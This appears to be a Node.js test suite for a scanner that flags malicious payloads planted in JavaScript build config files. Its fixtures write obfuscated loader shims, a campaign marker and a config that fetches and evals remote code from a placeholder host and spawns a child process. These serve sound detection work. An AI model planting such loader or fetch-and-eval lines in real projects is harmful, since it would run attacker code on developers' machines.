import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test } from 'node:test';

import { scanConfigPayloads } from './check-config-payloads.mjs';

const scriptPath = fileURLToPath(new URL('./check-config-payloads.mjs', import.meta.url));

test('flags obfuscated runtime loaders appended to config files', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'postcss.config.mjs'),
      "export default {};\n" +
        "global['!']='9-0123-3';var _$_1e42=(function(l,e){return []})(\"rmcej%otb%\",2857687);Tgw(2509);\n",
    );

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'postcss.config.mjs');
    assert.equal(findings[0].signature, "global['!']");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('flags quote and whitespace variants of the loader shim', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'next.config.cjs'),
      "module.exports = {};\n" +
        'global [ "!" ] = "9-0123-3";\n' +
        'global [ _$_1e42 [0] ] = require;\n',
    );

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'next.config.cjs');
    assert.match(findings[0].signature, /global/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('flags behavioral remote execution patterns in config files', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'eslint.config.mjs'),
      "export default [];\n" +
        'const run = (async () => {}).constructor.constructor("return process")();\n' +
        'eval(await fetch("https://example.invalid/payload").then((r) => r.text()));\n' +
        'run.mainModule.require("child_process").spawn("node", ["payload.js"]);\n',
    );

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'eslint.config.mjs');
    assert.equal(findings[0].signature, 'behavioral remote execution loader');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('ignores ordinary config files', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'postcss.config.mjs'),
      "const config = { plugins: { '@tailwindcss/postcss': {} } };\nexport default config;\n",
    );

    assert.deepEqual(scanConfigPayloads({ root }), []);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('flags the A9 campaign marker planted in a config file', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    const lines = [];
    for (let i = 0; i < 18; i++) lines.push(`// line ${i}`);
    lines.push('global.i="A9-0000-0";');
    writeFileSync(join(root, 'vite.config.mjs'), lines.join('\n') + '\n');

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'vite.config.mjs');
    assert.equal(findings[0].signature, 'campaign marker');
    assert.equal(findings[0].line, 19);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('flags an overlong line in a config file', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    const overlong = 'x'.repeat(4100);
    writeFileSync(join(root, 'jest.config.js'), `module.exports = {};\n${overlong}\n`);

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'jest.config.js');
    assert.equal(findings[0].signature, 'overlong config line');
    assert.equal(findings[0].line, 2);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('flags a createRequire shim planted in a postcss/tailwind/babel/eslint config', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'babel.config.mjs'),
      "import { createRequire } from 'module';\n" +
        'const require = createRequire(import.meta.url);\n' +
        'export default { presets: [] };\n',
    );

    const findings = scanConfigPayloads({ root });

    assert.equal(findings.length, 1);
    assert.equal(findings[0].file, 'babel.config.mjs');
    assert.equal(findings[0].signature, 'createRequire shim in config');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('does not flag a createRequire shim outside postcss/tailwind/babel/eslint configs', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-'));

  try {
    writeFileSync(
      join(root, 'next.config.mjs'),
      "import { createRequire } from 'node:module';\n" +
        'const require = createRequire(import.meta.url);\n' +
        'export default {};\n',
    );

    assert.deepEqual(scanConfigPayloads({ root }), []);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('CLI --root scans the given directory instead of the current working directory', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-cli-'));

  try {
    writeFileSync(
      join(root, 'postcss.config.mjs'),
      "global['!']='9-0123-3';\n",
    );

    // cwd is the package directory (clean); --root points at the planted fixture.
    const result = spawnSync(process.execPath, [scriptPath, '--root', root], {
      cwd: fileURLToPath(new URL('.', import.meta.url)),
      encoding: 'utf8',
    });

    assert.equal(result.status, 1);
    assert.match(result.stderr, /postcss\.config\.mjs:1 \(global\['!'\]\)/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('CLI defaults to the process working directory when --root is omitted', () => {
  const root = mkdtempSync(join(tmpdir(), 'agenthub-config-payloads-cli-'));

  try {
    writeFileSync(join(root, 'postcss.config.mjs'), "const config = {};\nexport default config;\n");

    const result = spawnSync(process.execPath, [scriptPath], {
      cwd: root,
      encoding: 'utf8',
    });

    assert.equal(result.status, 0);
    assert.match(result.stdout, /Config payload scan passed\./);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
